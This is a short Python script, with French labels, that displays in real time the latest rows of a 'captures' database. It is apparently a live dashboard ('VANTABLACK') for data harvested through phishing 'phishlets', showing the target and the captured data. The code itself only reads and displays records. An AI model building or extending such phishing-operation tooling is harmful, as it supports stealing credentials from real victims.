import sqlite3
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live

console = Console()

def get_latest_captures():
    try:
        conn = sqlite3.connect("hitch_vault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT timestamp, source, data FROM captures ORDER BY timestamp DESC LIMIT 10")
        rows = cursor.fetchall()
        conn.close()
        return rows
    except:
        return []

def generate_table() -> Table:
    table = Table(title="[bold yellow]TABLEAU DE BORD VANTABLACK - CAPTURES EN TEMPS RÉEL[/bold yellow]")
    table.add_column("Heure", style="cyan")
    table.add_column("Cible (Phishlet)", style="green")
    table.add_column("Données Capturées", style="white", overflow="fold")
    
    captures = get_latest_captures()
    for ts, source, data in captures:
        # Masquage basique pour l'affichage terminal
        short_data = data[:100] + "..." if len(data) > 100 else data
        table.add_row(ts, source, short_data)
    
    return table

def main():
    console.print("[bold green]Lancement du Moniteur de Captures... (CTRL+C pour quitter)[/]\n")
    with Live(generate_table(), refresh_per_second=1) as live:
        try:
            while True:
                time.sleep(1)
                live.update(generate_table())
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    main()
